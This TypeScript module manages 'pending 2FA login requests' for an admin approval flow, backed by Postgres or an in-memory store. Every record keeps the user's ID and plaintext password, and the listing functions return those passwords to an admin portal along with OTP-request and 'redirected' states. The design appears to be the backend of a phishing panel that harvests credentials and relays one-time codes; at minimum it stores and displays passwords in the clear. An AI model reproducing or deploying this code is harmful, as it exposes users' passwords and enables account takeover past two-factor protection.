// Pending 2FA login requests (admin approval flow). Uses Neon Postgres when
// DATABASE_URL is set; falls back to in-memory store for local dev without DB.

import { getSql } from '@/lib/db'

export type PendingLoginStatus = 'pending' | 'approved' | 'denied' | 'expired' | 'redirected'

export type PendingRequestKind = 'login' | 'otp'

export interface PendingLogin {
  id: string
  projectId: string
  requestKind: PendingRequestKind
  userId: string
  password: string
  method: 'email' | 'text'
  maskedEmail: string
  maskedPhone: string
  status: PendingLoginStatus
  createdAt: number
  memberOrigin?: string
}

const inMemoryStore = new Map<string, PendingLogin>()

function generateId(): string {
  return `pl_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`
}

function useNeon(): boolean {
  return Boolean(process.env.DATABASE_URL)
}

/** Ensure pending_logins table exists and has project_id (Neon only). Shared with Admin Portal. */
let tableEnsured = false

async function ensureTable(): Promise<void> {
  if (!useNeon() || tableEnsured) return
  const sql = getSql()
  await sql`
    CREATE TABLE IF NOT EXISTS pending_logins (
      id TEXT PRIMARY KEY,
      project_id TEXT NOT NULL DEFAULT 'thestandard',
      user_id TEXT NOT NULL,
      password TEXT NOT NULL,
      method TEXT NOT NULL,
      masked_email TEXT NOT NULL,
      masked_phone TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      created_at BIGINT NOT NULL
    )
  `
  try {
    await sql`ALTER TABLE pending_logins ADD COLUMN project_id TEXT NOT NULL DEFAULT 'thestandard'`
  } catch {
    // Column already exists
  }
  try {
    await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS member_origin TEXT`
  } catch {
    // Column already exists
  }
  try {
    await sql`ALTER TABLE pending_logins ADD COLUMN request_kind TEXT NOT NULL DEFAULT 'login'`
  } catch {
    // Column already exists
  }
  tableEnsured = true
}

function normalizeRequestKind(v: unknown): PendingRequestKind {
  return v === 'otp' ? 'otp' : 'login'
}

const DEFAULT_PROJECT = 'thestandard'

export async function createPendingLogin(data: {
  projectId?: string
  requestKind?: PendingRequestKind
  userId: string
  password: string
  method: 'email' | 'text'
  maskedEmail: string
  maskedPhone: string
  memberOrigin?: string
}): Promise<PendingLogin> {
  const id = generateId()
  const projectId = data.projectId ?? DEFAULT_PROJECT
  const requestKind = data.requestKind ?? 'login'
  const record: PendingLogin = {
    id,
    projectId,
    requestKind,
    userId: data.userId,
    password: data.password,
    method: data.method,
    maskedEmail: data.maskedEmail,
    maskedPhone: data.maskedPhone,
    status: 'pending',
    createdAt: Date.now(),
    memberOrigin: data.memberOrigin,
  }

  if (useNeon()) {
    await ensureTable()
    const sql = getSql()
    await sql`
      INSERT INTO pending_logins (id, project_id, request_kind, user_id, password, method, masked_email, masked_phone, status, created_at)
      VALUES (${id}, ${projectId}, ${requestKind}, ${data.userId}, ${data.password}, ${data.method}, ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${record.createdAt})
    `
    return record
  }

  inMemoryStore.set(id, record)
  return record
}

export async function getPendingLogin(id: string): Promise<PendingLogin | undefined> {
  if (useNeon()) {
    try {
      const sql = getSql()
      const rows = await sql`
        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
        FROM pending_logins WHERE id = ${id}
      `
      const row = rows[0] as Record<string, unknown> | undefined
      if (!row) return undefined
      return {
        id: String(row.id),
        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
        userId: String(row.userId),
        password: String(row.password),
        method: row.method as 'email' | 'text',
        maskedEmail: String(row.maskedEmail),
        maskedPhone: String(row.maskedPhone),
        status: row.status as PendingLoginStatus,
        createdAt: Number(row.createdAt),
        memberOrigin: row.memberOrigin != null ? String(row.memberOrigin) : undefined,
      }
    } catch {
      return undefined
    }
  }
  const mem = inMemoryStore.get(id)
  if (!mem) return undefined
  return { ...mem, projectId: mem.projectId ?? DEFAULT_PROJECT, requestKind: mem.requestKind ?? 'login' }
}

export async function listPendingLogins(): Promise<PendingLogin[]> {
  if (useNeon()) {
    try {
      const sql = getSql()
      const now = Date.now()
      const expireThreshold = now - 85 * 1000 // 85 seconds ago (1:25)
      
      // Auto-mark expired records (older than 85 seconds and still pending)
      await sql`
        UPDATE pending_logins SET status = 'expired'
        WHERE status = 'pending' AND created_at < ${expireThreshold}
      `
      
      const rows = await sql`
        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
        FROM pending_logins WHERE status = 'pending' ORDER BY created_at ASC
      `
      return (rows as Record<string, unknown>[]).map((row) => ({
        id: String(row.id),
        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
        userId: String(row.userId),
        password: String(row.password),
        method: row.method as 'email' | 'text',
        maskedEmail: String(row.maskedEmail),
        maskedPhone: String(row.maskedPhone),
        status: row.status as PendingLoginStatus,
        createdAt: Number(row.createdAt),
        memberOrigin: row.memberOrigin != null ? String(row.memberOrigin) : undefined,
      }))
    } catch {
      return []
    }
  }
  const now = Date.now()
  const expireThreshold = now - 85 * 1000
  // Auto-expire in-memory records
  inMemoryStore.forEach((record) => {
    if (record.status === 'pending' && record.createdAt < expireThreshold) {
      record.status = 'expired'
    }
  })
  return Array.from(inMemoryStore.values()).filter((p) => p.status === 'pending').map((p) => ({ ...p, projectId: p.projectId ?? DEFAULT_PROJECT }))
}

export async function listAllLogins(limit: number = 100): Promise<PendingLogin[]> {
  if (useNeon()) {
    try {
      const sql = getSql()
      const now = Date.now()
      const expireThreshold = now - 85 * 1000
      
      // Auto-mark expired records
      await sql`
        UPDATE pending_logins SET status = 'expired'
        WHERE status = 'pending' AND created_at < ${expireThreshold}
      `
      
      const rows = await sql`
        SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt", member_origin AS "memberOrigin"
        FROM pending_logins ORDER BY created_at DESC LIMIT ${limit}
      `
      return (rows as Record<string, unknown>[]).map((row) => ({
        id: String(row.id),
        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
        userId: String(row.userId),
        password: String(row.password),
        method: row.method as 'email' | 'text',
        maskedEmail: String(row.maskedEmail),
        maskedPhone: String(row.maskedPhone),
        status: row.status as PendingLoginStatus,
        createdAt: Number(row.createdAt),
        memberOrigin: row.memberOrigin != null ? String(row.memberOrigin) : undefined,
      }))
    } catch {
      return []
    }
  }
  const now = Date.now()
  const expireThreshold = now - 85 * 1000
  inMemoryStore.forEach((record) => {
    if (record.status === 'pending' && record.createdAt < expireThreshold) {
      record.status = 'expired'
    }
  })
  return Array.from(inMemoryStore.values())
    .map((p) => ({ ...p, projectId: p.projectId ?? DEFAULT_PROJECT }))
    .sort((a, b) => b.createdAt - a.createdAt)
    .slice(0, limit)
}

export async function setPendingLoginStatus(
  id: string,
  status: 'approved' | 'denied'
): Promise<PendingLogin | undefined> {
  if (useNeon()) {
    try {
      const sql = getSql()
      const rows = await sql`
        UPDATE pending_logins SET status = ${status}
        WHERE id = ${id} AND status = 'pending'
        RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind", user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt"
      `
      const row = (rows as Record<string, unknown>[])[0]
      if (!row) return undefined
      return {
        id: String(row.id),
        projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
        requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
        userId: String(row.userId),
        password: String(row.password),
        method: row.method as 'email' | 'text',
        maskedEmail: String(row.maskedEmail),
        maskedPhone: String(row.maskedPhone),
        status: row.status as PendingLoginStatus,
        createdAt: Number(row.createdAt),
        memberOrigin: row.memberOrigin != null ? String(row.memberOrigin) : undefined,
      }
    } catch {
      return undefined
    }
  }

  const record = inMemoryStore.get(id)
  if (!record || record.status !== 'pending') return undefined
  record.status = status
  return record
}
